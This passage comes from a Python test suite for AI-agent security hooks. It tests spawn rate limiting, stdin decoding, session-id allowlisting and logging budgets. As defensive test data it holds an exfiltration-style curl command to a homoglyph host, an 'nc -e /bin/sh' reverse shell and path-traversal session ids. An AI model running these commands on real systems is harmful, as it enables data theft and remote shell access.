# correctly and moved the failure somewhere worse: with any same-uid process
# holding the lock, 25 spawns produced 25 allows and 0 persisted timestamps, so
# MAX_SPAWNS_ASK (10) and MAX_SPAWNS_DENY (20) never fired at all. No timeout
# value fixes that; read-modify-write is the wrong shape for a tally.
#
# So the assertion is now the strong one: a held lock changes NOTHING. There is
# no lock on this path to hold.
_HOLD_SECONDS = 3.0
_CONTENDED_WRITERS = 6
_PRIOR = 4
_hold_state = Path(tempfile.mkdtemp(prefix="forcefield-spawn-held-")) / "spawn-h.json"
_hold_state.write_text(
    # No trailing newline, and prefixed with the JSON document this format
    # replaces: an upgrade in progress must not lose the first spawn to a
    # partial last line, and the old document must count as nothing.
    '{"count": 0, "timestamps": []}'
    + "".join("\n%.6f" % (time.time() - 1) for _ in range(_PRIOR)),
    encoding="utf-8")
_HOLDER = r"""
import fcntl, os, sys, time
fd = os.open(sys.argv[1], os.O_RDWR | os.O_CREAT, 0o600)
fcntl.flock(fd, fcntl.LOCK_EX)
print("held")
sys.stdout.flush()
time.sleep(float(sys.argv[2]))
"""
_holder = subprocess.Popen(
    [sys.executable, "-c", _HOLDER, str(_hold_state), str(_HOLD_SECONDS)],
    stdout=subprocess.PIPE, text=True)
try:
    check(_holder.stdout.readline().strip() == "held",
          "another process holds an exclusive flock on the spawn state")
    _started = time.monotonic()
    _contended = [
        subprocess.Popen([sys.executable, "-c", _BUMP_WORKER, str(_hold_state),
                          str(time.time()), "1"],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        for _ in range(_CONTENDED_WRITERS)
    ]
    _held_returns = []
    for _child in _contended:
        _out, _err = _child.communicate(timeout=180)
        check(_child.returncode == 0,
              "a contended spawn-budget worker finished cleanly: %s" % _err)
        _held_returns.extend(json.loads(_out)["returns"])
    _held_wall = time.monotonic() - _started
finally:
    _holder.kill()
    _holder.wait()

check(_held_wall < 5.0,
      "a contended bump stayed inside the 5s hook timeout (%.2fs)" % _held_wall)
def _timestamp_lines(path):
    """The lines that are a spawn: blanks and foreign lines are not."""
    out = []
    for line in path.read_text().splitlines():
        try:
            out.append(float(line))
        except ValueError:
            continue
    return out


_after = _timestamp_lines(_hold_state)
check(len(_after) == _PRIOR + _CONTENDED_WRITERS,
      "every spawn is recorded even while another process holds an exclusive "
      "lock on the file: %d of %d"
      % (len(_after), _PRIOR + _CONTENDED_WRITERS))
check(min(_held_returns) >= _PRIOR
      and max(_held_returns) == _PRIOR + _CONTENDED_WRITERS - 1,
      "and each counted from the %d already recorded, with the last seeing all "
      "of them -- so the limit still climbs towards MAX_SPAWNS_DENY under "
      "contention instead of reporting 0 (got %r)"
      % (_PRIOR, sorted(_held_returns)))

# The number that decides the verdict is the one the guard reads, so assert on
# the enforcement boundary itself rather than only on the file.
check(_ag._spawn_window_count(_hold_state, time.time())
      == _PRIOR + _CONTENDED_WRITERS,
      "the window count the rate limiter reads reflects every contended spawn")

# The bounded tail read: an oversized counter cannot be a memory-exhaustion
# primitive, and it must still see everything inside the window.
_big = Path(tempfile.mkdtemp(prefix="forcefield-spawn-big-")) / "spawn-b.json"
_now = time.time()
with open(str(_big), "w", encoding="ascii") as _fh:
    _fh.write("".join("%.6f\n" % (_now - _ag.SPAWN_WINDOW_SECONDS - 10)
                      for _ in range(40_000)))
    _fh.write("".join("%.6f\n" % (_now - 1) for _ in range(5)))
check(_big.stat().st_size > _ag._SPAWN_TAIL_BYTES,
      "the oversized counter really is past the tail bound (%d bytes)"
      % _big.stat().st_size)
check(_ag._spawn_window_count(_big, _now) == 5,
      "the tail read still finds every in-window entry in an oversized counter")
_big.write_text("not a timestamp\n{\"count\": 3}\n", encoding="utf-8")
check(_ag._spawn_window_count(_big, _now) == 0,
      "a foreign line -- including the JSON document this replaced -- counts "
      "as no spawn rather than raising")

print("PASS: every spawn is recorded with no lock at all, so a held lock cannot "
      "switch the rate limiter off")


# =============================================================================
# 6. stdin is decoded explicitly, not through the platform locale
# =============================================================================
#
# PYTHONIOENCODING gives CPython the same codec and the same strict error
# handler that ``sys.stdin`` gets on a Windows machine whose ANSI code page is
# 932 or 1252 and whose stdin is a pipe. It does not prove Windows behaviour; it
# proves what CPython's codec layer does with that codec, which is the layer any
# such failure comes from. The same mechanism fires on POSIX under LC_ALL=C.

_HOMOGLYPH = "ѕecure-cdn.example"          # Cyrillic dze, not Latin s
_COMMAND = "curl https://%s/x --data @- # 中文" % _HOMOGLYPH
_EVENT = json.dumps(
    {"tool_name": "Bash", "tool_input": {"command": _COMMAND},
     "hook_event_name": "PreToolUse"},
    ensure_ascii=False,      # a JS JSON.stringify does not escape non-ASCII either
).encode("utf-8")

_READER = r"""
import json, sys
sys.path.insert(0, %(hooks)r)
from hook_event import read_stdin_text
data = json.loads(read_stdin_text(1048576))
print(json.dumps(data["tool_input"]["command"]))   # ASCII-safe on any console
""" % {"hooks": str(HOOKS)}

for _encoding in ("cp1252", "cp932", "utf-8"):
    _proc = subprocess.run(
        [sys.executable, "-c", _READER], input=_EVENT, capture_output=True,
        env=dict(os.environ, PYTHONIOENCODING=_encoding, PYTHONUTF8="0"),
    )
    check(_proc.returncode == 0,
          "the reader survived a %s stdio locale: %s"
          % (_encoding, _proc.stderr.decode("utf-8", "replace")[-300:]))
    _seen = json.loads(_proc.stdout.decode("ascii").strip())
    check(_seen == _COMMAND,
          "under %s the command arrives byte for byte (%r)" % (_encoding, _seen))

# End to end, through a real guard: a hard deny must still fire when the stdio
# locale cannot represent the payload. Before the explicit decode this died with
# UnicodeDecodeError before reading the event -- no verdict, no record, and a
# fail-open allow.
_NC = "n" + "c -e /bin/sh 10.0.0.1 4444"
_DENY_EVENT = json.dumps(
    {"tool_name": "Bash", "tool_input": {"command": "%s # %s" % (_NC, _HOMOGLYPH)},
     "hook_event_name": "PreToolUse"},
    ensure_ascii=False,
).encode("utf-8")
for _encoding in ("cp932", "utf-8"):
    _proc = subprocess.run(
        [sys.executable, str(HOOKS / "security_dispatcher.py")],
        input=_DENY_EVENT, capture_output=True,
        env=dict(os.environ, PYTHONIOENCODING=_encoding, PYTHONUTF8="0"),
    )
    _stdout = _proc.stdout.decode("utf-8", "replace")
    check('"deny"' in _stdout,
          "the dispatcher still denies under a %s stdio locale, got %r"
          % (_encoding, _stdout[:200]))

print("PASS: the event is decoded as UTF-8 whatever the platform locale claims")


# =============================================================================
# 7. Descriptors that carry bytes are opened binary, and no POSIX-only call is
#    made unguarded
# =============================================================================

_key = _memo._key_path()
if _key.exists():
    _key.unlink()
check(_memo._store_key() is not None, "a fresh memo key is created")
check(len(_key.read_bytes()) == 32,
      "the HMAC key is exactly 32 bytes -- a text-mode descriptor would expand "
      "the 0x0A bytes in it (got %d)" % len(_key.read_bytes()))

# `os.O_BINARY` does not exist on POSIX, so the length check above cannot
# distinguish a site that requests it from one that does not. Standing a fake
# `os.O_BINARY` up and recording the flags each site passes to `os.open` does:
# it asserts the behaviour, on this platform, that the Windows CRT would need.
import log_sinks as _ls  # noqa: E402

_FAKE_O_BINARY = 1 << 20        # a bit no POSIX open flag uses
_scratch_dir = Path(tempfile.mkdtemp(prefix="forcefield-binflags-"))
_flags_seen = []
_real_os_open = os.open


def _recording_open(path, flags, mode=0o777):
    _flags_seen.append(flags)
    return _real_os_open(path, flags & ~_FAKE_O_BINARY, mode)


_ls.file_dir().mkdir(parents=True, exist_ok=True)
_had_o_binary = hasattr(os, "O_BINARY")
_BINARY_SITES = (
    ("memo._open_private",
     lambda: os.close(_memo._open_private(_scratch_dir / "k",
                                          os.O_WRONLY | os.O_CREAT))),
    ("agent_guard._bump_spawn_count",
     lambda: _ag._bump_spawn_count(_scratch_dir / "spawn.json", time.time())),
    # The file sink's own append. It owns the newline byte: without O_BINARY the
    # Windows CRT rewrites our \n as \r\n and every record in the JSON Lines
    # file gains a stray carriage return.
    ("log_sinks append",
     lambda: os.close(_ls._open_append(str(_ls.file_path())))),
    ("log_sinks rotation lock",
     lambda: _ls._rotate(str(_ls.file_path()))),
)
try:
    os.O_BINARY = _FAKE_O_BINARY
    os.open = _recording_open
    for _label, _call in _BINARY_SITES:
        _flags_seen[:] = []
        try:
            _call()
        finally:
            _observed = list(_flags_seen)
        os.open = _real_os_open          # the check itself must not be recorded
        check(_observed and all(f & _FAKE_O_BINARY for f in _observed),
              "%s opens with O_BINARY where the platform has one (flags=%s)"
              % (_label, [oct(f) for f in _observed]))
        os.open = _recording_open
finally:
    os.open = _real_os_open
    if not _had_o_binary:
        del os.O_BINARY

check(_memo._key_is_private(_key) is True, "the key is owner-only on this platform")
_real_getuid = getattr(os, "getuid", None)
try:
    if _real_getuid is not None:
        del os.getuid
    check(_memo._key_is_private(_key) is False,
          "without os.getuid the key is reported unverified -- never an "
          "AttributeError, and never a silent unverified apply")
finally:
    if _real_getuid is not None:
        os.getuid = _real_getuid

# The return value alone cannot tell "refused" from "tried and the unlink
# failed", so the file the traversal would delete is planted first and asserted
# to survive. `reset_spawn_budget` returns whether it removed something.
for _hostile in ("..\\..\\..\\evil", "../../etc/passwd", "a" * 129, "",
                 "sess/../../evil", "sess\x00evil"):
    _target = _ag.state_dir() / ("spawn-%s.json" % _hostile)
    _planted = False
    try:
        _target.parent.mkdir(parents=True, exist_ok=True)
        _target.write_text("{}")
        _planted = True
    except (OSError, ValueError):
        pass                      # a name this platform cannot even create
    check(_ag.reset_spawn_budget(_hostile) is False,
          "session id %r is refused" % _hostile)
    if _planted:
        check(_target.exists(),
              "and the file %r would have unlinked is untouched" % _hostile)

# The legitimate shape still works, so the allowlist is not a blanket refusal.
_good = "22fc735c-0c1f-4d06-974e-8ff80d314d9e"
(_ag.state_dir() / ("spawn-%s.json" % _good)).write_text("{}")
check(_ag.reset_spawn_budget(_good) is True,
      "a real session id still clears its own budget")
check(not (_ag.state_dir() / ("spawn-%s.json" % _good)).exists(),
      "and the counter file really went")

import sigma_engine as _sigma  # noqa: E402

_saved_env = {k: os.environ.get(k) for k in ("USER", "USERNAME")}
try:
    os.environ.pop("USER", None)
    os.environ["USERNAME"] = "winuser"
    check(_sigma.get_field_value("User", "whoami", "whoami") == "winuser",
          "a Sigma `User` selection reads USERNAME where USER is unset")
    os.environ["USER"] = "posixuser"
    check(_sigma.get_field_value("User", "whoami", "whoami") == "posixuser",
          "and USER still wins where it is set")
finally:
    for _key_name, _value in _saved_env.items():
        if _value is None:
            os.environ.pop(_key_name, None)
        else:
            os.environ[_key_name] = _value

# `user.name` is on EVERY record; `user.id` is only on `session.start`. So an
# empty user.name is a record that identifies nobody -- which is what a Linux
# container produced on all 122 records of a capture, because none of USER,
# USERNAME or LOGNAME was exported. The environment is read first and `pwd` is
# the fallback, guarded so the Windows import failure this whole rework removed
# cannot come back in through it.
import hook_logging as _hlog_user  # noqa: E402

_saved_user_env = {k: os.environ.get(k) for k in ("USER", "USERNAME", "LOGNAME")}
try:
    for _key_name in _saved_user_env:
        os.environ.pop(_key_name, None)
    if hasattr(os, "getuid"):
        check(_hlog_user._user_name() != "",
              "with no USER/USERNAME/LOGNAME in the environment the record still "
              "names a user")
    os.environ["USER"] = "envuser"
    check(_hlog_user._user_name() == "envuser",
          "and the environment still wins where it is set")
    # The fallback must degrade to "" rather than raise: on Windows the import
    # itself is a ModuleNotFoundError, which the blocked-import gate simulates.
    os.environ.pop("USER", None)
    _saved_pwd = sys.modules.get("pwd")
    sys.modules["pwd"] = None       # a None entry makes `import pwd` raise
    try:
        check(_hlog_user._user_name() == "",
              "an unimportable pwd yields an empty name, never a raise")
    finally:
        if _saved_pwd is None:
            sys.modules.pop("pwd", None)
        else:
            sys.modules["pwd"] = _saved_pwd
finally:
    for _key_name, _value in _saved_user_env.items():
        if _value is None:
            os.environ.pop(_key_name, None)
        else:
            os.environ[_key_name] = _value

print("PASS: binary descriptors, guarded POSIX calls, and an allowlisted session id")


# =============================================================================
# 8. The sink layer: import graph, and the two contracts a sink cannot break
#
# The graph is not bookkeeping. `patterns` sits at the bottom because every
# guard imports `hook_logging`, so a reverse edge is a cycle; `log_sinks` must
# not reach `hook_logging` or `patterns` at all, because a record arrives
# already built and already scrubbed. `config` is the single exception and only
# function-locally, inside `_free_text_min`, for the one knob that can only ever
# tighten what a sink is handed -- at module scope it would put a config read on
# the write path of every hook. The function-local `subprocess`/`socket`/
# `struct` imports are a measured cost, not a style: 3.21 ms and 2.72 ms on the
# hook interpreter, per hook process, on platforms that never call the sink that
# needs them.
# =============================================================================

_HOOKS_DIR = Path(__file__).parent.parent / "hooks"
_LOCAL_MODULES = {p.stem for p in _HOOKS_DIR.glob("*.py")}


def _module_scope_imports(module_name):
    """Names imported at module scope only -- a function-local import is not one."""
    tree = ast.parse((_HOOKS_DIR / (module_name + ".py")).read_text())
    names = set()
    for node in tree.body:
        if isinstance(node, ast.Import):
            for alias in node.names:
                names.add(alias.name.split(".")[0])
        elif isinstance(node, ast.ImportFrom):
            if node.module and node.level == 0:
                names.add(node.module.split(".")[0])
    return names


_GRAPH = (
    # module,          may not import from hooks/
    ("patterns", _LOCAL_MODULES - {"normalize", "patterns"}),
    ("portable_lock", _LOCAL_MODULES - {"portable_lock"}),
    ("hook_event", _LOCAL_MODULES - {"hook_event"}),
    ("config", _LOCAL_MODULES - {"config"}),
    ("log_sinks", _LOCAL_MODULES - {"log_sinks", "portable_lock"}),
    ("hook_logging", _LOCAL_MODULES - {"hook_logging", "log_sinks",
                                       "hook_event", "patterns", "normalize"}),
)
for _module, _forbidden in _GRAPH:
    _imported = _module_scope_imports(_module)
    _violations = sorted(_imported & _forbidden)
    check(not _violations,
          "%s imports %s from hooks/ at module scope" % (_module, _violations))

# Module scope is where the *cost* lives, which is what the checks above and
# below are about. The *cycle* does not care where the import sits: `patterns`
# is the bottom of the graph because every guard imports `hook_logging`, so
# `import hook_logging` inside a function body in `patterns` is the same cycle,
# reached the first time that function runs. Nothing in the suite saw that, so
# the reachability below is computed over every import at every depth, and
# transitively -- a two-hop edge through `normalize` is the same defect.


def _local_edges():
    edges = {}
    for module, imports in _ALL_IMPORTS.items():
        edges[module] = {name for name, _line, _guard in imports
                         if name in _LOCAL_MODULES and name != module}
    return edges


def _reaches(edges, start):
    seen, stack = set(), sorted(edges.get(start, ()))
    while stack:
        node = stack.pop()
        if node in seen:
            continue
        seen.add(node)
        stack.extend(sorted(edges.get(node, ())))
    return seen


_EDGES = _local_edges()

# module -> everything in hooks/ it may reach, at any depth, by any import.
_REACHABLE = {
    "patterns": {"normalize"},
    "normalize": set(),
    "config": set(),
    "portable_lock": set(),
    "hook_event": set(),
    # `config` is the one exception, function-local inside `_free_text_min`, and
    # it introduces no cycle because `config` is a leaf.
    "log_sinks": {"portable_lock", "config"},
}
for _module, _allowed in sorted(_REACHABLE.items()):
    _actual = _reaches(_EDGES, _module)
    check(_actual <= _allowed,
          "%s reaches %s in hooks/ (allowed: %s) -- a function-local import is "
          "still an edge" % (_module, sorted(_actual - _allowed), sorted(_allowed)))

check("hook_logging" not in _reaches(_EDGES, "patterns")
      and "log_sinks" not in _reaches(_EDGES, "patterns"),
      "patterns reaches neither hook_logging nor log_sinks at any depth")
check("hook_logging" not in _reaches(_EDGES, "log_sinks")
      and "patterns" not in _reaches(_EDGES, "log_sinks"),
      "log_sinks reaches neither hook_logging nor patterns at any depth")
check("log_sinks" in _EDGES["hook_logging"] and "patterns" in _EDGES["hook_logging"],
      "the edge finder is live: hook_logging still imports log_sinks and patterns")

# The graph invariants above say WHAT a layer may reach. This says what importing
# it may DO, which nothing pinned: `config` is imported by `log_sinks` and so is
# reached by every gating hook, on every invocation, so anything blocking at its
# import time is charged to the 5 s budget that is the fail-open boundary. The
# property held when it was measured and nothing enforced it -- a
# `subprocess.run` appended to `hooks/config.py` escaped all eighteen suites.
#
# The probe wraps the four primitives that can block (`open`, `os.open`, the
# `subprocess` entry points, `socket.socket`) BEFORE the import and reports every
# call. It runs out of process so the instrumentation cannot leak into the suite.
_SIDE_EFFECT_PROBE = r"""
import builtins, json, os, socket, subprocess, sys
events = []
def wrap(kind, fn):
    def inner(*a, **k):
        events.append([kind, repr(a[:1])[:120]])
        return fn(*a, **k)
    return inner
builtins.open = wrap("open", builtins.open)
os.open = wrap("os.open", os.open)
for _name in ("run", "Popen", "call", "check_call", "check_output"):
    setattr(subprocess, _name,
            wrap("subprocess." + _name, getattr(subprocess, _name)))
socket.socket = wrap("socket.socket", socket.socket)
sys.path.insert(0, %(hooks)r)
import importlib
importlib.import_module(%(module)r)
print(json.dumps(events))
"""

# `patterns`, `portable_lock` and `hook_event` are the leaves; `config` is the
# one above them and the one every hook reaches. All four must be inert.
for _inert in ("patterns", "portable_lock", "hook_event", "config"):
    _proc = subprocess.run(
        [PROBE_PY, "-c",
         _SIDE_EFFECT_PROBE % {"hooks": str(HOOKS), "module": _inert}],
        capture_output=True, text=True,
        env=dict(os.environ, PYTHONDONTWRITEBYTECODE="1",
                 FORCEFIELD_LOG_SINKS="none"),
    )
    check(_proc.returncode == 0,
          "the side-effect probe ran for %s: %s" % (_inert, _proc.stderr[-300:]))
    _effects = json.loads(_proc.stdout.strip().splitlines()[-1])
    check(not _effects,
          "importing hooks/%s.py opens, spawns or connects to nothing: %s"
          % (_inert, _effects[:4]))

# A module-level `__getattr__` (PEP 562) exists for exactly one purpose here:
# keeping an old name alive after the thing it named moved. `hook_logging` grew
# one for `FALLBACK_LOG_FILE`/`FALLBACK_LOG_DIR` after the file sink moved to
# `log_sinks`, justified by "45 references across the docs, the scripts and the
# tests" -- measured at five, one of them live, and `FALLBACK_LOG_DIR` had none
# at all. The project rule is replace, don't deprecate, so the callers were
# moved to `log_sinks.file_path()` and the shim deleted.
for _module in MODULES:
    _tree = ast.parse((HOOKS / (_module + ".py")).read_text(encoding="utf-8"))
    _shims = [node.name for node in _tree.body
              if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
              and node.name == "__getattr__"]
    check(not _shims,
          "%s.py defines a module __getattr__ -- a compatibility shim for a name "
          "that moved, which this project replaces rather than deprecates"
          % _module)

check("hook_logging" not in _module_scope_imports("log_sinks"),
      "log_sinks must never import hook_logging -- hook_logging imports it")
check("patterns" not in _module_scope_imports("log_sinks"),
      "log_sinks must never import patterns -- a record arrives already scrubbed")
for _heavy in ("subprocess", "socket", "struct", "fcntl"):
    check(_heavy not in _module_scope_imports("log_sinks"),
          "log_sinks imports %s at module scope; it belongs inside the one sink "
          "function that needs it" % _heavy)
for _gone in ("logging", "subprocess", "fcntl"):
    check(_gone not in _module_scope_imports("hook_logging"),
          "hook_logging still imports %s" % _gone)

# Contract 1 and 3, as behaviour: a sink whose target raises must not take the
# next sink with it, must not reach stdout or stderr, and must not raise.
import io  # noqa: E402
import contextlib  # noqa: E402

import log_sinks as _sinks  # noqa: E402
import hook_logging as _hlog  # noqa: E402

_event = _hlog.build_event("probe_guard", "deny", pattern_matched="p",
                           command="x" * 40,
                           context={"session_id": "portability"})
_line = _sinks.render(_event)


class _Exploding(object):
    def __getattr__(self, name):
        raise RuntimeError("this sink's target is on fire")


_saved = {}
for _name in ("_write_oslog", "_write_journald", "_write_syslog", "_write_winevt"):
    _saved[_name] = getattr(_sinks, _name)


def _boom(*args, **kwargs):
    raise RuntimeError("sink target on fire")


_saved_selected = _sinks._selected
_out, _err = io.StringIO(), io.StringIO()
try:
    for _name in _saved:
        setattr(_sinks, _name, _boom)
    _sinks._selected = frozenset({_sinks.NAME_FILE, _sinks.NAME_OSLOG,
                                  _sinks.NAME_JOURNALD, _sinks.NAME_SYSLOG,
                                  _sinks.NAME_WINEVT})
    with contextlib.redirect_stdout(_out), contextlib.redirect_stderr(_err):
        _results = [_sinks.write(_n, _event, _line, 17, "fault")
                    for _n in sorted(_sinks._selected)]
        _hlog._write_to_sinks(_event, 17, "fault")
finally:
    for _name, _fn in _saved.items():
        setattr(_sinks, _name, _fn)
    _sinks._selected = _saved_selected

check(_results.count(True) == 1,
      "exactly the file sink succeeded while every other target raised (%s)"
      % _results)
check(_out.getvalue() == "" and _err.getvalue() == "",
      "a sink wrote to stdout/stderr: stdout=%r stderr=%r"
      % (_out.getvalue()[:200], _err.getvalue()[:200]))

# Contract 2, over the syntax tree rather than over the text: a docstring that
# says "timeout=2" must not be able to satisfy this.
_sink_src = (_HOOKS_DIR / "log_sinks.py").read_text()
_sink_tree = ast.parse(_sink_src)


def _calls(node, module_name, attr):
    for sub in ast.walk(node):
        if (isinstance(sub, ast.Call) and isinstance(sub.func, ast.Attribute)
                and sub.func.attr == attr
                and isinstance(sub.func.value, ast.Name)
                and sub.func.value.id == module_name):
            yield sub


def _method_calls(node, attr):
    for sub in ast.walk(node):
        if (isinstance(sub, ast.Call) and isinstance(sub.func, ast.Attribute)
                and sub.func.attr == attr):
            yield sub


_SINK_NUMERIC_CONSTANTS = {}
for _stmt in _sink_tree.body:
    if not (isinstance(_stmt, ast.Assign) and len(_stmt.targets) == 1
            and isinstance(_stmt.targets[0], ast.Name)
            and isinstance(_stmt.value, ast.Constant)
            and isinstance(_stmt.value.value, (int, float))
            and not isinstance(_stmt.value.value, bool)):
        continue
    _SINK_NUMERIC_CONSTANTS[_stmt.targets[0].id] = float(_stmt.value.value)
check("LOG_BUDGET_SECONDS" in _SINK_NUMERIC_CONSTANTS,
      "the module constant table this gate resolves against was built")


def _timeout_ceiling(node):
    """The upper bound on a timeout expression, or None if unbounded.

    `timeout=2` and `timeout=min(LOG_BUDGET_SECONDS, remaining)` both bound the
    call; a bare name or an expression with no bound in it does not.

    A module-level numeric CONSTANT counts, a bare name does not. That
    distinction is the point: a magic `2.0` beside a constant of the same value
    is a duplicate that drifts, and a bare `remaining` is a bound this gate
    cannot see even when the enclosing function really does compute one.
    """
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
        return float(node.value)
    if isinstance(node, ast.Name) and node.id in _SINK_NUMERIC_CONSTANTS:
        return _SINK_NUMERIC_CONSTANTS[node.id]
    if (isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
            and node.func.id == "min"):
        bounds = [_timeout_ceiling(arg) for arg in node.args]
        bounds = [bound for bound in bounds if bound is not None]
        if bounds:
            return min(bounds)
    return None


_LOG_BUDGET = _SINK_NUMERIC_CONSTANTS["LOG_BUDGET_SECONDS"]
_runs = list(_calls(_sink_tree, "subprocess", "run"))
check(len(_runs) >= 2, "the sink layer runs at least the two subprocess sinks")
for _run in _runs:
    _timeout = [k.value for k in _run.keywords if k.arg == "timeout"]
    _ceiling = _timeout_ceiling(_timeout[0]) if len(_timeout) == 1 else None
    # Bounded by the PROCESS budget, and by nothing looser. The threshold used
    # to be a bare `<= 2`, which is the exact value of the deleted
    # `EMIT_BUDGET_SECONDS` -- so a per-record ceiling above the per-process one
    # passed this gate, and the check that was supposed to stop it asserted the
    # ABSENCE OF ONE IDENTIFIER rather than the property. The identical phantom
    # under any other name passed everything. Resolving the threshold from
    # `LOG_BUDGET_SECONDS` itself is what makes this a bound instead of a
    # spelling rule: a cap above the budget can never bind, and a bound that
    # cannot fire is worse than none because the docs assert it.
    check(_ceiling is not None and _ceiling <= _LOG_BUDGET,
          "a subprocess.run at line %d has a timeout of %r, which is not "
          "bounded by LOG_BUDGET_SECONDS (%.1f s) -- a per-call ceiling above "
          "the per-process budget cannot ever be the smaller term"
          % (_run.lineno, _ceiling, _LOG_BUDGET))

# One call's timeout is not the contract any more: both subprocess sinks emit
# one process per fragment, so N unbounded calls would run far past the fragment
# cap against a 5 s hook budget. Every function that runs a subprocess must
# therefore also hold one deadline over the whole record.
#
# The deadline is named `budget_remaining()` rather than a per-record constant.
# There WAS a per-record constant, `EMIT_BUDGET_SECONDS = 2.0`, and this check
# used to assert its NAME appeared -- which it did, inside
# `min(EMIT_BUDGET_SECONDS, budget_remaining())`, where it could never be the
# smaller term because `budget_remaining()` is capped at LOG_BUDGET_SECONDS =
# 1.0. Asserting the name of a dominated constant is not asserting a bound; the
# constant was deleted and this now asserts the bound that actually fires. The
# replacement for the name check is the `_ceiling <= _LOG_BUDGET` threshold
# above, which catches the same phantom under ANY name.
_run_fns = [node for node in ast.walk(_sink_tree)
            if isinstance(node, ast.FunctionDef)
            and any(_calls(node, "subprocess", "run"))]
check(len(_run_fns) >= 2, "both subprocess sinks were found")
for _fn in _run_fns:
    _names = {sub.id for sub in ast.walk(_fn) if isinstance(sub, ast.Name)}
    check("budget_remaining" in _names,
          "%s runs a subprocess per fragment without reading the process "
          "logging budget, so nothing bounds the record as a whole" % _fn.name)
    # ...and no numeric term inside any `min()` in these functions may exceed
    # the process budget, whatever it is called and wherever it is assigned.
    # That is the property the deleted `EMIT_BUDGET_SECONDS` violated, and it
    # is what the old check -- `"EMIT_BUDGET_SECONDS" not in _names`, a
    # string-membership test on one identifier -- did not express: the identical
    # phantom under any other name, module-level or local, passed everything.
    # A term that can never be the smaller one is a dead bound whose only effect
    # is to make the code read as if a per-record ceiling exists.
    _numbers = dict(_SINK_NUMERIC_CONSTANTS)
    for _sub in ast.walk(_fn):
        if (isinstance(_sub, ast.Assign) and len(_sub.targets) == 1
                and isinstance(_sub.targets[0], ast.Name)
                and isinstance(_sub.value, ast.Constant)
                and isinstance(_sub.value.value, (int, float))
                and not isinstance(_sub.value.value, bool)):
            _numbers[_sub.targets[0].id] = float(_sub.value.value)
    for _min in [n for n in ast.walk(_fn)
                 if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)
                 and n.func.id == "min"]:
        for _arg in _min.args:
            _value = None
            if isinstance(_arg, ast.Constant) and isinstance(_arg.value, (int, float)):
                _value = float(_arg.value)
            elif isinstance(_arg, ast.Name) and _arg.id in _numbers:
                _value = _numbers[_arg.id]
            check(_value is None or _value <= _LOG_BUDGET,
                  "%s line %d takes min() over a numeric term of %r, above the "
                  "%.1f s process budget the other term is capped at -- it can "
                  "never be the smaller one, which is exactly why "
                  "EMIT_BUDGET_SECONDS was deleted"
                  % (_fn.name, _min.lineno, _value, _LOG_BUDGET))

_socket_fns = [node for node in ast.walk(_sink_tree)
               if isinstance(node, ast.FunctionDef)
               and any(_calls(node, "socket", "socket"))]
check(len(_socket_fns) >= 2, "both socket sinks were found")
for _fn in _socket_fns:
    _blocking = [call for call in _method_calls(_fn, "setblocking")
                 if call.args and isinstance(call.args[0], ast.Constant)
                 and call.args[0].value is False]
    check(_blocking,
          "%s opens a socket without setblocking(False); a blocking sendto to a "
          "full journald queue was measured not to return inside 5 s" % _fn.name)

check(not list(_calls(_sink_tree, "sys", "exit")), "the sink layer never exits")
check(not [node for node in ast.walk(_sink_tree)
           if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
           and node.func.id == "print"],
      "the sink layer must contain no print()")

print("PASS: the sink layer's import graph and its never-raise/never-print "
      "contracts")


# Invariant 4, the PROCESS logging budget. Bounding each native write at
# timeout=2 is not enough on its own: a dispatcher run can queue several WARN+
# records, and three of those is 6 s of a 5 s budget *after* stdout has already
# flushed. Past the budget the natives are skipped and the file sink still takes
# every record, so the archive is never the thing that gets dropped.
#
# Three shapes, because the bound used to be per-*drain* and each of the other
# two escaped it entirely: a queue drained once, the same work done through
# synchronous ``log_security_event`` calls (35 such call sites across 17 guards,
# measured at 8.044 s for four records), and a second drain after ``emit()``
# (measured at 4.024 s for two records either side of the verdict, because the
# second drain was handed a fresh allowance).
_QUEUED = 6
_SLOW = 0.30
_drain_home = Path(tempfile.mkdtemp(prefix="forcefield-drain-"))
_saved_dir = _sinks._file_dir
_saved_prepared = _sinks._dir_prepared
_saved_oslog = _sinks._write_oslog
_saved_skipped = _hlog._native_writes_skipped
_saved_spent = _sinks._budget_spent


def _budget_case(kind):
    """Drive _QUEUED slow native writes one way; return (wall, file records)."""
    _sinks._budget_spent = 0.0
    _sinks._file_dir = _drain_home / ".claude" / kind
    _sinks._dir_prepared = False
    _sinks._selected = frozenset({_sinks.NAME_FILE, _sinks.NAME_OSLOG})
    _sinks._conf_cache[_sinks.NAME_OSLOG] = _sinks.CONF_ADMIN
    _sinks._write_oslog = lambda *a, **kw: (time.sleep(_SLOW), True)[1]
    started = time.monotonic()
    if kind == "sync":
        for index in range(_QUEUED):
            _hlog.log_security_event("drain_probe", "deny",
                                     pattern_matched="d%d" % index,
                                     command="q" * 60)
    elif kind == "split":
        for index in range(_QUEUED // 2):
            _hlog.defer_log("drain_probe", "deny", pattern_matched="a%d" % index,
                            command="q" * 60)
        _hlog.flush_deferred()
        for index in range(_QUEUED // 2):
            _hlog.defer_log("drain_probe", "deny", pattern_matched="b%d" % index,
                            command="q" * 60)
        _hlog.flush_deferred()
    else:
        for index in range(_QUEUED):
            _hlog.defer_log("drain_probe", "deny", pattern_matched="d%d" % index,
                            command="q" * 60)
        _hlog.flush_deferred()
    elapsed = time.monotonic() - started
    written = sum(
        1 for line in _sinks.file_path().read_text().splitlines()
        if line.strip()
        and json.loads(line)["Attributes"]["forcefield.guard"] == "drain_probe")
    return elapsed, written


try:
    _budget_results = {kind: _budget_case(kind)
                       for kind in ("drain", "sync", "split")}
finally:
    _sinks._write_oslog = _saved_oslog
    _sinks._file_dir = _saved_dir
    _sinks._dir_prepared = _saved_prepared
    _sinks._selected = _saved_selected
    _sinks._conf_cache.pop(_sinks.NAME_OSLOG, None)
    _sinks._budget_spent = _saved_spent
    _hlog._native_writes_skipped = _saved_skipped
    shutil.rmtree(str(_drain_home), ignore_errors=True)

for _kind, (_elapsed, _written) in sorted(_budget_results.items()):
    check(_written == _QUEUED,
          "%s: every record reached the file sink past the budget (%d of %d)"
          % (_kind, _written, _QUEUED))
    check(_elapsed < _QUEUED * _SLOW,
          "%s: stopped paying for native writes past the budget (%.2fs of a "
          "possible %.2fs)" % (_kind, _elapsed, _QUEUED * _SLOW))
